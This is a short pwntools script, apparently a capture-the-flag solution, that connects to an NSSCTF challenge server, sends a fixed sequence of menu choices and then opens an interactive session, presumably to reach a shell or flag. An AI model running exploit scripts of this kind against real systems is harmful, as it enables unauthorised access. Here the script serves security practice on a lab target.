from pwn import *

# io=process("./pwn")
io=remote("node3.anna.nssctf.cn",28749)
io.sendline(b"3")
io.sendline(b"0")
io.sendline(b"3")
io.sendline(b"0")
io.sendline(b"2")
io.sendline(b"1")

io.interactive()
